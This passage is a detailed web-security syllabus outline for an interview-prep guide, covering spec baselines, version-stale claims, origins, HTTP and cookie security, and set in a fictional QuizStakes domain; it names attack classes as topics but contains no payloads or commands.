# Syllabus — 13 Web Security

**Target version baseline (checked 2026-09-03).** Every constant, header name, directive, parameter,
grant name, algorithm identifier and default below is stated against this set of specifications and
releases, and every leaf that depends on a version says so:

| Layer | Normative source this file targets |
|---|---|
| Risk catalogue | **OWASP Top 10:2025** as current; **OWASP Top 10:2021** covered in parallel because it is what most interviewers still quote |
| API risk catalogue | **OWASP API Security Top 10:2023** (API1–API10) |
| Verification standard | **OWASP ASVS 5.0.0** — 17 chapters (V1–V17), ~350 requirements |
| Prescriptive guidance | **OWASP Cheat Sheet Series** (accessed 2026-09-03) |
| Weakness / severity taxonomy | **CWE** (MITRE), **CVSS 4.0**, **EPSS**, **CISA KEV** |
| HTTP semantics + auth framework | **RFC 9110** (June 2022), § 11 for the authentication framework and `WWW-Authenticate` |
| Cookies | **RFC 6265** (published) plus **draft-ietf-httpbis-rfc6265bis** (Aug 2026, approved, in the RFC Editor queue) — the bis draft is where `SameSite`, the prefixes and the size/lifetime caps are normative |
| Partitioned cookies | **CHIPS** (Privacy CG) — the `Partitioned` attribute |
| Origin / same-origin policy | **RFC 6454** (`Origin`), **WHATWG HTML** (browsing contexts, agent clusters), **WHATWG URL** |
| CORS | **WHATWG Fetch** Living Standard (CORS protocol, preflight, safelists) |
| CSP | **W3C Content Security Policy Level 3** (Working Draft, 13 Aug 2026) |
| Fetch metadata | **W3C Fetch Metadata Request Headers** (`Sec-Fetch-Site`/`-Mode`/`-Dest`/`-User`) |
| Trusted Types | **W3C Trusted Types** + CSP `require-trusted-types-for` / `trusted-types` |
| Subresource integrity | **W3C SRI** |
| HSTS | **RFC 6797** |
| Referrer | **W3C Referrer Policy** |
| Permissions | **W3C Permissions Policy** (`Permissions-Policy`, replacing `Feature-Policy`) |
| OAuth core | **RFC 6749** + **RFC 6750** (bearer) as the deployed base; **draft-ietf-oauth-v2-1-13** (May 2025) as OAuth 2.1 |
| OAuth security | **RFC 9700 = BCP 240** (Jan 2025) — *the* citable security BCP, supersedes draft-ietf-oauth-security-topics |
| OAuth extensions | PKCE **RFC 7636**, DPoP **RFC 9449**, mTLS client auth + certificate-bound tokens **RFC 8705**, PAR **RFC 9126**, JAR **RFC 9101**, RAR **RFC 9396**, device grant **RFC 8628**, token exchange **RFC 8693**, introspection **RFC 7662**, revocation **RFC 7009**, AS metadata **RFC 8414**, dynamic client registration **RFC 7591/7592**, JWT client auth + assertions **RFC 7521/7523**, resource indicators **RFC 8707**, JWT access-token profile **RFC 9068**, step-up authentication challenge **RFC 9470** |
| Browser-based apps | **draft-ietf-oauth-browser-based-apps** (OAuth for Browser-Based Applications BCP) |
| OIDC | **OpenID Connect Core 1.0** (final, errata incorporated), **Discovery 1.0**, **Dynamic Registration 1.0**, **RP-Initiated Logout 1.0**, **Front-Channel Logout 1.0**, **Back-Channel Logout 1.0** (final), **Session Management 1.0**, **CIBA (MODRNA)**, **FAPI 2.0 Security Profile** |
| JOSE | JWS **RFC 7515**, JWE **RFC 7516**, JWK **RFC 7517**, JWA **RFC 7518**, JWT **RFC 7519**, examples **RFC 7520**, unencoded payload **RFC 7797**, **JWT BCP RFC 8725** |
| TLS | **RFC 8446** (TLS 1.3), **RFC 5246** (TLS 1.2, historical), **RFC 5280** (X.509 PKIX), **RFC 6962/9162** (Certificate Transparency), **RFC 8555** (ACME), **RFC 7469** (HPKP — retired, covered as a cautionary tale) |
| Passwords / identity assurance | **NIST SP 800-63B-4** (digital identity guidelines, authenticator requirements) |
| Password hashing parameters | **OWASP Password Storage Cheat Sheet** (accessed 2026-09-03) — Argon2id, scrypt, bcrypt, PBKDF2 numbers taken verbatim |
| Phishing-resistant auth | **W3C WebAuthn Level 3** (Candidate Recommendation, Mar 2025), **FIDO2 / CTAP 2.2**, passkeys |
| Java runtime | **Java 21 LTS** for all code |
| Framework | **Spring Boot 3.5.x / Spring Security 6.5.x** as the baseline (what production is on); **Spring Security 7.0 / Spring Boot 4.x** marked `[VERSION-TRAP]` at every leaf it changes |
| Java deserialization defence | **JEP 290** (Java 9, serialization filters), **JEP 415** (Java 17, context-specific filter factories) |
| Supply chain | **SLSA v1.0** (build track, levels 0–3), **CycloneDX**, **SPDX** (ISO/IEC 5962:2021), **Sigstore/cosign**, **in-toto attestations** |
| Threat modelling | **Threat Modeling Manifesto** (four questions), **STRIDE**, attack trees, **PASTA**, LINDDUN for privacy |

## The fourteen deltas that most often produce a stale web-security answer

Each is marked `[VERSION-TRAP]` at its leaf.

1. **OWASP Top 10:2025 exists and reorders everything.** The current list is A01 Broken Access
   Control, A02 Security Misconfiguration, A03 **Software Supply Chain Failures** (new), A04
   Cryptographic Failures, A05 Injection, A06 Insecure Design, A07 Authentication Failures, A08
   Software or Data Integrity Failures, A09 Security **Logging and Alerting** Failures, A10
   **Mishandling of Exceptional Conditions** (new). Security Misconfiguration moved 5→2.
   `src/topics/13-web-security.md` § 12 teaches only the 2021 list. `[RESEARCH]`
2. **SSRF is no longer a standalone Top 10 entry.** A10:2021 SSRF does not appear as its own
   category in 2025; it survives as API7:2023 in the API Top 10 and as a mechanism under access
   control. The 2021 framing must be taught *and* labelled as 2021. `[RESEARCH]`
3. **"Vulnerable and Outdated Components" was replaced by "Software Supply Chain Failures."** The
   scope widened from "your dependency is old" to build systems, CI, registries, provenance and
   distribution. `[RESEARCH]`
4. **OAuth 2.1 makes PKCE mandatory for every client, including confidential ones**, requires
   **exact string matching** of redirect URIs, **removes the implicit and ROPC grants entirely**,
   **forbids bearer tokens in query strings**, and requires refresh tokens for public clients to be
   either sender-constrained or rotated. The 2019-era answer ("PKCE is for mobile") is wrong.
5. **RFC 9700 / BCP 240 is the citable OAuth security document** (Jan 2025). Every answer that cites
   "draft-ietf-oauth-security-topics" is citing a draft that became this RFC.
6. **Spring Security 6 changed CSRF defaults.** `XorCsrfTokenRequestAttributeHandler` is the default
   (BREACH mitigation — the rendered token value changes on every request even though the underlying
   token does not), and `CsrfToken` loading is **deferred** via `DeferredCsrfToken`. "The CSRF token
   is a stable per-session value you can compare byte-for-byte" is a 5.x answer.
7. **Spring Security 7.0 removes the non-lambda DSL and `authorizeRequests()`**, replaces
   `MvcRequestMatcher`/`AntPathRequestMatcher` with `PathPatternRequestMatcher`, adds first-class
   **MFA**, **passkeys/WebAuthn**, **one-time-token login**, `csrf().spa()`,
   `AuthorizationManagerFactory`, `Authentication.Builder` and Password4j encoders, enables **PKCE by
   default**, and drops the OAuth2 password grant. `[RESEARCH]`
8. **RFC 6265bis makes `SameSite=Lax` the formal default**, caps cookie `name=value` at **4096
   octets** and each attribute value at **1024 octets**, caps cookie lifetime at **400 days
   (34 560 000 s)**, requires `Secure` with `SameSite=None`, and defines `__Secure-` / `__Host-`
   prefix semantics with case-insensitive matching.
9. **NIST SP 800-63B-4 inverted the classic password advice.** No composition rules, no forced
   periodic rotation, blocklist-check against breach corpora, allow paste and long passphrases,
   minimum 8 characters with 15 recommended, accept all printable Unicode.
10. **The password-hashing parameters everyone quotes are a decade stale.** OWASP's current numbers
    are Argon2id `m=47104 (46 MiB), t=1, p=1` (with an equal-security ladder down to
    `m=7168 (7 MiB), t=5, p=1`), scrypt `N=2^17, r=8, p=1` (down to `N=2^13, r=8, p=10`), bcrypt
    work factor **minimum 10**, PBKDF2-HMAC-SHA256 **600 000** iterations, PBKDF2-HMAC-SHA512
    **220 000**, PBKDF2-HMAC-SHA1 **1 400 000**. "PBKDF2 with 10 000 iterations" is a 2015 answer.
11. **Three security headers are dead and citing them dates you.** `X-XSS-Protection` (the auditor
    was removed from Chrome and it introduced its own vulnerabilities), `Public-Key-Pins` /
    HPKP (RFC 7469, retired), and `Expect-CT` (retired now that CT is universally enforced).
    `X-Frame-Options` is superseded by CSP `frame-ancestors` and kept only for legacy clients;
    `report-uri` is deprecated in favour of `report-to`.
12. **CVSS 4.0 exists**, and severity alone is not a prioritisation strategy — **EPSS** (exploit
    probability) and the **CISA KEV** catalogue (known exploited) are the layer that turns a
    500-finding SCA report into a work queue.
13. **WebAuthn Level 3 / passkeys changed the MFA answer.** Synced passkeys, discoverable
    credentials (formerly "resident keys"), conditional UI, and **Related Origin Requests** (one
    passkey usable across a set of related domains) mean "MFA means TOTP" is out of date, and
    phishing-resistance is the property that matters. `[RESEARCH]`
14. **Java's deserialization story has two generations.** JEP 290 (Java 9) gave a JVM-wide
    pattern filter (`jdk.serialFilter`) with `maxdepth`/`maxrefs`/`maxbytes`/`maxarray` limits; JEP
    415 (Java 17) added a **filter factory** (`jdk.serialFilterFactory`) for context-specific
    filters. "Java has no defence, never deserialize" is a Java 8 answer — the correct answer is
    "still never deserialize untrusted input, *and* here is the filter you set as defence in depth."

## Scope boundary against the sibling guides

This file owns **the adversary**: every way a request, a token, a byte of input or a dependency can
be turned against the system, and the mechanism of each defence. Owned elsewhere:

- TCP, the TLS *handshake as a networking cost*, HTTP/1.1-vs-2-vs-3 framing, DNS, load balancers,
  connection pooling, timeouts and retries live in `10-networking.md`. This guide owns TLS as a
  **trust** mechanism — what it proves, what it does not, certificate validation, mTLS identity,
  and the failure modes. `[X-REF 10]`
- The API *contract face* of security — which header carries the credential, `WWW-Authenticate`,
  the 401-vs-403-vs-404 information-leak choice, scope-to-endpoint mapping, rate-limit headers,
  `Idempotency-Key` — lives in `12-api-design.md`. This guide owns why each choice is the secure
  one. `[X-REF 12]`
- `DispatcherServlet`, the servlet filter lifecycle, the proxy model, `@Transactional` self-
  invocation, bean lifecycle and Boot auto-configuration live in `07-spring-core.md`. This guide
  owns the Spring **Security** layer built on them. `[X-REF 07]`
- Query plans, indexes, isolation levels and MVCC live in `09-sql-databases.md`. This guide owns
  the prepared-statement protocol as an **injection** defence and row-level security as an
  **authorization** mechanism. `[X-REF 09]`
- The persistence context, `@Query`, projections and repository derivation live in
  `08-spring-data-jpa.md`. This guide owns the injection-safe subset and owner-scoped queries.
  `[X-REF 08]`
- IAM policies, roles, instance profiles, KMS, Secrets Manager, VPC/security groups, WAF and
  Shield live in `18-cloud-aws.md`. This guide owns the application-side contract with each.
  `[X-REF 18]`
- Image layers, non-root containers, `Secret` objects, network policies, service-mesh mTLS,
  admission control and image signing *as platform features* live in `19-docker-kubernetes.md`.
  `[X-REF 19]`
- SAST/DAST/SCA *as CI mechanics*, test slices, `spring-security-test`'s plumbing, Testcontainers
  and contract tests live in `16-testing.md`. This guide owns what a security test must assert.
  `[X-REF 16]`
- Structured logging, metrics, tracing, alerting and postmortems live in
  `20-observability-operations.md`. This guide owns the security-specific event set, the audit-log
  integrity requirement, and the detection question. `[X-REF 20]`
- Kafka/RabbitMQ mechanics, the outbox and saga live in `14-messaging-queues.md`. This guide owns
  message-level authenticity and the poisoned-message case. `[X-REF 14]`
- Redis mechanics and eviction live in `15-caching.md`. This guide owns cache-key tenancy bugs and
  the shared-store rate limiter's correctness. `[X-REF 15]`
- Load shedding as a capacity strategy, quorum arithmetic, multi-region and the 45-minute design
  structure live in `22-system-design.md`. This guide owns the security requirements a design must
  satisfy. `[X-REF 22]`
- Java serialization mechanics, `ObjectInputStream`, class loading and the JVM's security-relevant
  runtime areas live in `03-java-core.md` and `06-jvm-internals.md`. This guide owns the
  **attack** on them. `[X-REF 03]` `[X-REF 06]`
- Virtual threads, `ThreadPoolExecutor`, `CompletableFuture` and the memory model live in
  `05-multithreading-concurrency.md`. This guide owns the concurrency bugs that are *security*
  bugs — TOCTOU, race conditions on limits, `SecurityContextHolder` propagation. `[X-REF 05]`
- Git history, hooks and rewriting live in `17-git-craft.md`. This guide owns the leaked-secret
  procedure. `[X-REF 17]`

Where a concept is owned elsewhere the leaf carries `[X-REF nn]`, and the bible states the mechanism
in one paragraph *before* pointing away — it never sends the reader off empty-handed.

## The example domain

**Every example, endpoint, identifier, status code and number comes from the QuizStakes domain in
`src/scenario/scenario.md`.** The security-relevant surfaces the bible must attack and defend are:
card deposit (`DEP-000` … `DEP-910`), inbound bank-deposit push (`BDP-*`), withdrawal, stake
reservation (`ReserveStake` / `SettleStake` / `VoidStake` across the Quiz Engine black box),
instrument verification, the restriction decision call, onboarding application capture (`AO-*`),
activation (`AA-*`), document upload and requirements, and the operator-facing `PaymentRun`. The
services are `ApplicationGateway`, `RouterInt`, `JwtService`, `AccountOpening`,
`AccountMaintenance`, `ClientRestrictions`, `PaymentService`, `FundsLedger`, `DocumentRequirements`,
`InternalPlatforms`, `ProfileService`. Never `bank.com`, `evil.com` as the *only* framing, never
`/users/1234`, never `Dog extends Animal`.

The four architectural rules from scenario § 5.1 are security constraints and the bible must say so
at the point of decision: the **client token is stripped at `ApplicationGateway`** and replaced with
an application token (so no client-controlled claim ever reaches an internal service); **no token
carries permissions, restrictions or account status** (so authorization is always a live decision,
never a cached claim — this is the single most important design statement in the whole guide);
`FundsLedger` uses **partition affinity by client id**, which buys locality and *nothing* for
correctness or isolation; and **`PaymentRun` is not a client state**, so operator authority and
client authority are different authorization domains.

The numbers from Appendix A that constrain security design: **2.4M registered clients**, **95k card
deposits/day at 40/sec**, **2.8M stake reservations/day at 1,200/sec with 3,400/sec settlement
bursts**, **19.8M ledger entries/day at 230 writes/sec sustained and 13,600/sec peak**, a **30 ms
restriction-decision budget**, a **150 ms stake-reservation budget**, a hard **500 ms
self-exclusion budget**, three `FundsLedger` instances at **12 GB heap**, operator sessions living
**30–90 minutes**.

## Tag legend

| Tag | Meaning for the write pass |
|---|---|
| `[PROVE]` | work the argument through; do not state the result and move on |
| `[SOURCE]` | quote real spec text, RFC section, source code or javadoc (short excerpt) and explain every line |
| `[BUILD]` | ship complete, compiling Java 21 code (or a complete runnable artifact where the artifact is YAML/SQL/HTTP) |
| `[TRAP]` | must carry a `**Trap:**` marker — wrong belief, symptom, fix |
| `[RESEARCH]` | leaf exists because of the research phase; re-verify against the cited source before writing |
| `[VERSION-TRAP]` | widely-repeated claim that is version-stale; state what is true in the baseline and what changed |
| `[X-REF nn]` | one-paragraph mechanism here, full treatment in guide nn |
| `[NUM]` | state the number, default value, byte arithmetic or parameter explicitly |
| `[HDR]` | give the exact HTTP field name and an example value |
| `[CODE]` | give the exact status code number and the client action it prescribes |
| `[API]` | give the exact Java/Spring type or method signature |
| `[WIRE]` | show the actual bytes/headers/payload on the wire, not a description |
| `[SPEC]` | cite the specific RFC/spec section number, not just the document |
| `[FLOW]` | must be rendered as an ordered step-by-step trace |
| `[ATTACK]` | must show the attacker's actual request/payload, then the fix |
| `[TABLE]` | must be rendered as a table |
| `[CVE]` | name the real CVE/incident and its mechanism |

---

# PART 1 — BASICS

## §1.1 Why web security is a distinct discipline

1.1.1 The problem statement: a web application is a program whose *inputs are supplied by its
      adversary*, executed on infrastructure the adversary can probe, on behalf of users the
      adversary can impersonate. Every other engineering discipline assumes a cooperative caller;
      security is the discipline that removes that assumption. `[PROVE]`
1.1.2 What makes web specifically hard: the client is untrusted **and** the client is a
      general-purpose programmable runtime (the browser) that the attacker can also drive, from a
      page the attacker controls, against a session the victim owns.
1.1.3 The asymmetry that defines the field: the defender must be right on every path; the attacker
      needs one path. Therefore *defence in depth* is not belt-and-braces conservatism, it is the
      only strategy with a positive expected value. `[PROVE]`
1.1.4 The economics: attacks are automated and near-zero marginal cost (credential stuffing against
      2.4M QuizStakes accounts costs the attacker a botnet, not a person), so "too obscure to be
      worth attacking" is never a control. `[NUM]`
1.1.5 Why "security is a non-functional requirement" is a category error: for QuizStakes the
      regulatory gates *are* the product. A self-exclusion that takes 600 ms instead of 500 ms is a
      compliance failure, not a latency regression. `[SOURCE]`
1.1.6 The four ways security work actually reaches production, ranked by leverage: a secure default
      in a framework, a platform control, a CI gate, a developer remembering. Design so the last
      one is never load-bearing. `[TABLE]`
1.1.7 Shift-left vs shift-right, honestly: threat modelling and secure defaults catch design flaws;
      SAST/SCA catch known-bad code and libraries; DAST and pentest catch integration reality;
      runtime detection catches everything else. None subsumes another. `[TABLE]`
1.1.8 What the interview is actually grading: **mechanism**. "Use bcrypt" scores zero; "bcrypt is
      deliberately slow with a tunable cost factor and a per-password salt, so an attacker with the
      dump cannot run a fast GPU dictionary attack and identical passwords do not collide" scores.
      Every section of this bible is written to be stated that way. `[SOURCE]`
1.1.9 The three questions that turn any security answer into a strong one: *what exactly does the
      attacker control*, *what boundary does the payload cross*, *what makes crossing it safe*.
1.1.10 The reading list, ranked, with what each is for: OWASP ASVS 5.0 (the requirement checklist
       with the best coverage-per-page in the field), OWASP Cheat Sheet Series (the prescriptive
       layer), RFC 9700 (the single best security document in OAuth), RFC 8725 (the same for JWT),
       the OWASP Top 10 (the vocabulary interviewers use), *The Tangled Web* (Zalewski — the
       browser model), *The Web Application Hacker's Handbook* (the attacker's procedure), PortSwigger
       Web Security Academy (the labs), *Real-World Cryptography* (Wong — crypto without the
       mathematics), Shostack's *Threat Modeling*. `[SOURCE]` `[RESEARCH]`

*(10 leaves)*

## §1.2 The vocabulary, stated once

1.2.1 **Confidentiality, integrity, availability** — and the two usually-omitted additions,
      **authenticity** and **non-repudiation**. Which QuizStakes invariant each maps to. `[TABLE]`
1.2.2 **Threat / vulnerability / exploit / risk** distinguished precisely: risk is the composition,
      and only risk can be prioritised. `[PROVE]`
1.2.3 **Asset**, **attack surface**, **attack vector**, **entry point**, **trust boundary** — and
      why the trust boundary is the object threat modelling actually operates on.
1.2.4 **Threat actor taxonomy** and what each changes about your design: opportunistic scanner,
      credential-stuffing operator, targeted external attacker, malicious insider, compromised
      dependency, compromised CI, nation-state. `[TABLE]`
1.2.5 The **web attacker** vs **network attacker** vs **related-domain attacker** vs **malicious
      script** models from the academic literature — naming the model is what makes a claim like
      "CSRF tokens defend against a web attacker but not against XSS" precise. `[PROVE]`
1.2.6 **Authentication** (who are you, → `401`), **authorization** (may you, → `403`),
      **accounting/audit** (what happened). Three layers, three failure modes. `[CODE]`
1.2.7 **Identification** vs **authentication** vs **verification** vs **assurance level** (NIST
      IAL/AAL/FAL). Which QuizStakes onboarding step supplies which. `[SPEC]` `[RESEARCH]`
1.2.8 **Least privilege**, **separation of duties**, **complete mediation**, **fail-safe defaults**,
      **economy of mechanism**, **open design**, **psychological acceptability** — Saltzer &
      Schroeder's principles, with the QuizStakes example of each. `[TABLE]` `[SOURCE]`
1.2.9 **Defence in depth** vs **security theatre**: a control is depth only if it fails
      independently of the control above it. `[PROVE]`
1.2.10 **Fail closed vs fail open**, and the one place fail-open is defensible (availability of a
       non-security path) versus where it is a breach (the `ClientRestrictions` call timing out at
       30 ms must not mean "no restrictions"). `[NUM]` `[TRAP]`
1.2.11 **Allowlist vs denylist**, and the structural reason allowlists win: a denylist enumerates
       badness, which is unbounded and grows. `[PROVE]`
1.2.12 **Sanitization vs validation vs encoding vs escaping** — four different operations that
       tutorials use interchangeably, and the bug each substitution causes. `[TABLE]` `[TRAP]`
1.2.13 **Encoding vs encryption vs hashing vs signing vs MACing** — the five-way distinction, with
       "base64 is not encryption" as the canonical error. `[TABLE]` `[TRAP]`
1.2.14 **Secret vs credential vs key vs token vs identifier** — and why treating an identifier as a
       capability is the root of IDOR.
1.2.15 **Capability vs identity** authorization models: a signed URL is a capability, a session is
       an identity. Different revocation stories.
1.2.16 **Idempotency, replay, freshness, nonce, salt, pepper, IV** — six words for "make this
       message unique", each with a different job. `[TABLE]` `[TRAP]`
1.2.17 **CWE vs CVE vs CVSS vs EPSS vs KEV vs GHSA** — the identifier ecosystem and what each is
       for. CVSS 4.0's base/threat/environmental/supplemental metric groups. `[TABLE]`
       `[VERSION-TRAP]`
1.2.18 **Zero-day, n-day, 0-click, RCE, LPE, info-leak, DoS** — the impact vocabulary that appears
       in advisories you have to triage.
1.2.19 **Compensating control**, **risk acceptance**, **residual risk** — the language you need when
       the honest answer is "we are not fixing this, here is why". `[STAFF-grade framing]`
1.2.20 **Confused deputy** — the abstract shape shared by CSRF, SSRF and clickjacking: a privileged
       component is tricked into using its authority on an attacker's behalf. Naming it once makes
       three attacks one idea. `[PROVE]`

*(20 leaves)*

## §1.3 The browser security model — origins and the same-origin policy

1.3.1 Why the browser needs a security model at all: it runs code from mutually hostile parties in
      one process tree with one cookie jar. `[PROVE]`
1.3.2 The **origin** triple: `(scheme, host, port)`. RFC 6454's definition, the serialization
      (`https://quizstakes.example:443`), and the opaque origin. `[SPEC]` `[NUM]`
1.3.3 Concrete origin comparison table — the pairs candidates get wrong: `http` vs `https` (differ),
      `:443` vs default (same for https), `a.example.com` vs `example.com` (differ), path differences
      (same), `file:` and `data:` and `blob:` origins. `[TABLE]` `[TRAP]`
1.3.4 **Site** vs **origin**: the registrable domain (eTLD+1) from the Public Suffix List, and
      "schemeful same-site". Cookies are scoped by *site*; the DOM is scoped by *origin*. This one
      mismatch is the source of most cookie confusion. `[PROVE]` `[TRAP]`
1.3.5 The **Public Suffix List** as a piece of load-bearing infrastructure that is a text file in a
      Mozilla repository, and what that means for `*.github.io`-style shared-suffix hosting.
      `[RESEARCH]`
1.3.6 What the **same-origin policy actually restricts**, enumerated per resource type — because
      "SOP blocks cross-origin requests" is false: DOM access (blocked), reading a fetch/XHR
      response (blocked without CORS), *sending* a request (allowed), embedding an image/script/
      stylesheet/iframe (allowed, opaque), reading a canvas after drawing a cross-origin image
      (blocked/tainted), `localStorage`/`sessionStorage`/IndexedDB (per-origin), cookies (per-site,
      the exception). `[TABLE]` `[PROVE]` `[TRAP]`
1.3.7 The consequence that makes CSRF possible: SOP prevents *reading*, not *sending*, and a state
      change does not need a readable response. `[PROVE]`
1.3.8 `document.domain` — what it used to allow, why it is deprecated/removed, and
      `Origin-Agent-Cluster` as the replacement direction. `[VERSION-TRAP]` `[RESEARCH]`
1.3.9 Cross-origin communication channels that are *intentional*: `postMessage` (and its
      `targetOrigin` / `event.origin` checks), CORS, `Channel Messaging`, `SharedWorker`. `[API]`
1.3.10 The **cross-origin leak** class: even with SOP, side channels leak information —
       `frameCount`, `window.length`, image dimensions, load/error timing, `Content-Length` via
       timing, `history.length`. This is why COOP/COEP exist. `[ATTACK]` `[RESEARCH]`
1.3.11 **Site isolation** as a process-level enforcement of the origin model, and why Spectre made
       it necessary — the SOP is a language-level rule that speculative execution can read around.
       `[PROVE]` `[RESEARCH]`
1.3.12 **Mixed content**: passive vs active, blocking rules, `upgrade-insecure-requests`, and why
       one `http://` script tag voids the page's TLS guarantees. `[PROVE]`
1.3.13 **Secure contexts**: which APIs require one (`crypto.subtle`, service workers, geolocation,
       `credentials.create`), and why `localhost` counts. `[SPEC]`
1.3.14 The **browser's other principals**: extensions, devtools, the user themselves. Client-side
       controls are advisory — the user is not the attacker's victim in every model, sometimes the
       user *is* the attacker (bonus abuse in QuizStakes). `[TRAP]`
1.3.15 Storage partitioning and the third-party-cookie phase-out as a background trend that changes
       cross-site auth patterns. `[RESEARCH]`

*(15 leaves)*

## §1.4 HTTP as a security substrate

1.4.1 The parts of a request an attacker controls, enumerated: method, path, query, every header
      (including `Host`, `Origin`, `Referer`, `User-Agent`, `X-Forwarded-For`), cookies, body, and
      the *number and timing* of requests. Anything not in this list is the only thing you may
      trust. `[TABLE]` `[PROVE]`
1.4.2 Safe / idempotent / cacheable method semantics as a **security** property: a `GET` with a side
      effect is a CSRF vector and a cache-poisoning vector at once. `[X-REF 12]` `[TRAP]`
1.4.3 The HTTP authentication framework: `WWW-Authenticate`, `Authorization`, challenge/credential
      syntax, the `realm` and `scope` parameters, and the registered schemes — `Basic` (RFC 7617),
      `Digest` (RFC 7616), `Bearer` (RFC 6750), `Negotiate`, `DPoP`. `[SPEC]` `[HDR]`
1.4.4 Why **HTTP Basic** is not "insecure" but is *unsuitable*: base64 is not protection, there is
      no logout, credentials are replayed on every request, and it is ambient (so CSRF applies).
      `[PROVE]` `[TRAP]`
1.4.5 **HTTP Digest**'s design (nonce, `qop`, `cnonce`, `nc`) and why it still lost: it requires the
      server to store a password-equivalent, and TLS made the wire-protection argument moot.
1.4.6 `401` vs `403` vs `404` as an **information-disclosure decision**, not a taxonomy exercise:
      when returning `403` confirms a resource exists and `404` is the correct lie. `[CODE]`
      `[X-REF 12]`
1.4.7 Error responses as a leak surface: stack traces, SQL fragments, framework banners, internal
      hostnames, `X-Powered-By`, verbose validation errors that enumerate valid values. Map to
      A10:2025 Mishandling of Exceptional Conditions. `[TRAP]` `[VERSION-TRAP]`
1.4.8 The `Referer` header as a leak channel: tokens in URLs reaching third parties, and
      `Referrer-Policy` as the control. `[HDR]`
1.4.9 URLs as a leak surface, enumerated: browser history, server logs, proxy logs, CDN logs,
      `Referer`, bookmarks, screen shares, analytics. Therefore **no credentials, tokens or PII in
      query strings** — and OAuth 2.1 codifies this for bearer tokens. `[PROVE]`
      `[VERSION-TRAP]`
1.4.10 The `Host` header and absolute-URI construction: password-reset links built from
       `request.getHeader("Host")` are attacker-controlled. `[ATTACK]`
1.4.11 `X-Forwarded-For` / `Forwarded` / `X-Forwarded-Proto` as **attacker-controlled unless the
       first proxy overwrites them** — the rate-limit bypass and the audit-log poisoning that
       follow. `[ATTACK]` `[TRAP]`
1.4.12 Reverse proxies and the parsing-differential principle: two parsers, one message, different
       interpretations. The precondition for request smuggling and for header-based auth bypass.
       `[PROVE]`
1.4.13 Content type as a security decision: `Content-Type` sniffing, `X-Content-Type-Options:
       nosniff`, and why serving user content with the wrong type is stored XSS. `[HDR]`
1.4.14 `Content-Disposition: attachment` and a separate untrusted-content origin as the two real
       defences for user-uploaded files. `[PROVE]`
1.4.15 HTTP methods you did not mean to expose: `TRACE` (XST), `OPTIONS`, `PUT`/`DELETE` via
       `X-HTTP-Method-Override`, and WebDAV verbs.
1.4.16 Caching as a security boundary: `Cache-Control: private, no-store` on authenticated
       responses, `Vary` correctness, and the shared-cache leak when you get it wrong.
       `[X-REF 12]` `[X-REF 15]`
1.4.17 Request size limits, header count limits, and multipart limits as availability controls, with
       the exact Spring/Tomcat properties. `[NUM]` `[API]`
1.4.18 `Clear-Site-Data` on logout — what it can clear (`cache`, `cookies`, `storage`,
       `executionContexts`) and why logout is not just deleting one cookie. `[HDR]` `[RESEARCH]`

*(18 leaves)*

## §1.5 Cookies

1.5.1 What a cookie is mechanically: a name/value pair the server asks the client to store and
      replay, with attributes that constrain *when* it replays. `[SPEC]`
1.5.2 `Set-Cookie` grammar and the full attribute list with semantics: `Expires`, `Max-Age`,
      `Domain`, `Path`, `Secure`, `HttpOnly`, `SameSite`, `Partitioned`. `[SPEC]` `[WIRE]`
1.5.3 Session cookie vs persistent cookie, and `Max-Age` taking precedence over `Expires`.
      `[SPEC]`
1.5.4 The **400-day cap**: user agents reduce any `Expires`/`Max-Age` beyond 400 days
      (34 560 000 s). `[NUM]` `[VERSION-TRAP]`
1.5.5 The **size limits**: `name=value` ≤ 4096 octets, each attribute value ≤ 1024 octets,
      recommended ≤ 50 cookies per domain and ≤ 3000 total. The direct consequence: a fat JWT in a
      cookie can silently exceed the limit and the session vanishes. `[NUM]` `[TRAP]`
1.5.6 `Domain` semantics and the counter-intuitive part: setting `Domain=quizstakes.example`
      *widens* scope to all subdomains; omitting it is the **narrower**, safer host-only cookie.
      Everyone gets this backwards. `[PROVE]` `[TRAP]`
1.5.7 `Path` is **not** a security boundary: any same-origin script can read any path's cookies via
      an iframe, and path matching is a prefix rule. `[PROVE]` `[TRAP]`
1.5.8 `Secure` — sent only over secure channels — and the explicit caveat from the spec that it
      **provides no integrity** against an active network attacker who can write cookies over
      `http://`. `[SOURCE]` `[TRAP]`
1.5.9 `HttpOnly` — invisible to `document.cookie` — and precisely what it does and does not buy:
      it stops exfiltration of the cookie value, not the *use* of the session by injected script.
      `[PROVE]` `[TRAP]`
1.5.10 `SameSite=Strict` / `Lax` / `None` semantics, the "safe top-level navigation" carve-out in
       `Lax`, `Lax`-as-formal-default, unrecognised values treated as `Lax`, the
       "Lax-allowing-unsafe" two-minute window for newly set cookies, and `None` requiring `Secure`.
       `[SPEC]` `[NUM]` `[VERSION-TRAP]`
1.5.11 The `__Secure-` prefix: requires the `Secure` attribute; matching is case-insensitive.
       `[SPEC]` `[NUM]`
1.5.12 The `__Host-` prefix: requires `Secure`, `Path=/`, **no `Domain`**, host-only — the only
       mechanism that stops a subdomain from overwriting your session cookie. `[SPEC]` `[PROVE]`
1.5.13 **Cookie tossing / cookie-forcing** by a related-domain attacker on a sibling subdomain, and
       why `__Host-` is the fix. `[ATTACK]` `[RESEARCH]`
1.5.14 The `Partitioned` attribute (CHIPS): double-keyed by cookie domain **and** top-level site;
       requires `Secure`; interacts with `SameSite=None`. When a legitimate embedded QuizStakes
       widget needs it. `[SPEC]` `[RESEARCH]`
1.5.15 Cookie ordering, duplicate names, and the shadowing ambiguity — no integrity, no origin, no
       ordering guarantee the server can rely on. `[TRAP]`
1.5.16 Cookies and ports: cookies ignore the port, so `:8080` and `:443` on the same host share a
       jar. Another origin/site mismatch. `[PROVE]` `[TRAP]`
1.5.17 The exact `Set-Cookie` line QuizStakes should emit for an operator session on
       `InternalPlatforms`, every attribute justified. `[WIRE]` `[NUM]`
1.5.18 Spring's cookie surface: `ResponseCookie` builder, `server.servlet.session.cookie.*`
       properties (`http-only`, `secure`, `same-site`, `name`, `max-age`, `path`), and
       `CookieSerializer`/`DefaultCookieSerializer` in Spring Session. `[API]` `[NUM]`
1.5.19 `Set-Cookie` is the one header that must not be comma-folded — the RFC 9110 combining rule's
       exception. `[SPEC]` `[TRAP]` `[X-REF 12]`

*(19 leaves)*

## §1.6 Session management

1.6.1 Why sessions exist: HTTP is stateless, authentication is expensive, and a session is the
      cached result of an authentication decision. That framing explains every property that
      follows. `[PROVE]`
1.6.2 The session id as a **bearer capability**: whoever holds it is the user. Therefore entropy,
      transport, storage and lifetime are all it has. `[PROVE]`
1.6.3 Session id requirements, with numbers: ≥ 128 bits of entropy from a CSPRNG, no meaning
